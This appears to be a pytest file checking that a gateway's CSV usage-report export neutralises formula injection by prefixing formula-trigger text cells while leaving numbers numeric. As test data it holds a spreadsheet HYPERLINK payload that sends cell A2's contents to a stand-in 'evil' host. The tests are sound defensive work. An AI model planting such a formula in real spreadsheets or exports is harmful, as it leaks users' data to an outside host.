"""CSV formula injection (audit M7): every text cell is neutralised, numbers are not."""

from __future__ import annotations

import csv
import io
from datetime import UTC, datetime
from decimal import Decimal

import pytest
from gateway.csv_safe import csv_text
from gateway.reporting import report_to_csv
from gateway.schemas import PeriodResponse, UsageReport, UsageReportRow


@pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r", " =", "  @"])
def test_a_formula_trigger_is_made_text(lead: str) -> None:
    value = f'{lead}HYPERLINK("https://evil/?"&A2,"x")'
    assert csv_text(value) == "'" + value


@pytest.mark.parametrize("value", ["research", "gpt-4o", "a=b", "x-y", " plain", "", None])
def test_ordinary_text_is_untouched(value: str | None) -> None:
    assert csv_text(value) == (value or "")


def _row(key: str | None, label: str, split_label: str | None = None) -> UsageReportRow:
    return UsageReportRow(
        key=key,
        label=label,
        split_key=key,
        split_label=split_label,
        requests=-3,
        prompt_tokens=-7,
        completion_tokens=2,
        total_tokens=-5,
        cost=Decimal("-1.5"),
    )


def test_the_usage_csv_escapes_text_cells_and_keeps_numbers_numeric() -> None:
    evil = '=HYPERLINK("https://evil/?"&A2,"x")'
    report = UsageReport(
        period=PeriodResponse(
            label="2026-11",
            kind="month",
            start=datetime(2026, 11, 1, tzinfo=UTC),
            end=datetime(2026, 12, 1, tzinfo=UTC),
            timezone="UTC",
        ),
        group_by="api_key",
        split_by="model",
        currency="EUR",
        rows=[_row("+cmd", evil, "@sum")],
        totals=_row(None, "total"),
    )
    rows = list(csv.DictReader(io.StringIO(report_to_csv(report))))
    assert rows[0]["label"] == "'" + evil
    assert rows[0]["key"] == "'+cmd"
    assert rows[0]["split_label"] == "'@sum"
    assert rows[0]["split_key"] == "'+cmd"
    # A real negative number is not text and stays a number.
    assert rows[0]["prompt_tokens"] == "-7"
    assert rows[0]["cost"] == "-1.5"
